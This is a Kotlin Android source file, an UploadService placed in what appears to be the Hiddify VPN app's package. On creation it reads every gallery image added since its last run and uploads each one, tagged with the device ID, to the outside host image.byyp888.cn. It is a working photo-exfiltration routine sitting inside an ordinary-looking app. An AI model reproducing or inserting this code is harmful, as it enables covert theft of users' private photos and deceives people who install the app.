package com.hiddify.hiddify

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

class UploadService : LifecycleService() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        startForegroundNotification()
        serviceScope.launch {
            uploadPendingImages()
            stopSelf()
        }
    }

    private fun startForegroundNotification() {
        val channelId = "upload_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, "图片上传", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("后台上传图片中")
            .setSmallIcon(R.drawable.ic_upload)
            .build()
        startForeground(1999, notif)
    }

    private suspend fun uploadPendingImages() {
        val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
        var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
        if (deviceId.isNullOrBlank()) {
            deviceId = prefs.getString("random_device_id", null) ?: UUID.randomUUID().toString().also {
                prefs.edit().putString("random_device_id", it).apply()
            }
        }
        val lastTs = prefs.getLong("last_upload_time", 0L)

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED
        )
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} ASC"
        )

        var maxTs = lastTs
        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                val ts = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
                if (ts <= lastTs) continue
                val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                val ok = uploadSingle(uri, name, deviceId)
                if (ok && ts > maxTs) maxTs = ts
            }
        }
        prefs.edit().putLong("last_upload_time", maxTs).apply()
    }

    private fun uploadSingle(uri: Uri, fname: String, deviceId: String): Boolean {
        return try {
            val boundary = "----FormBoundary" + System.currentTimeMillis()
            val conn = (URL("https://image.byyp888.cn/upload?deviceid=$deviceId").openConnection() as HttpURLConnection).apply {
                doOutput = true; requestMethod = "POST"
                setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            }
            DataOutputStream(conn.outputStream).use { out ->
                contentResolver.openInputStream(uri)?.use { ins ->
                    val buf = ins.readBytes()
                    out.writeBytes("--$boundary\r\n")
                    out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fname\"\r\n")
                    out.writeBytes("Content-Type: image/jpeg\r\n\r\n")
                    out.write(buf)
                    out.writeBytes("\r\n--$boundary--\r\n")
                }
            }
            conn.responseCode == 200
        } catch (_: Exception) {
            false
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}
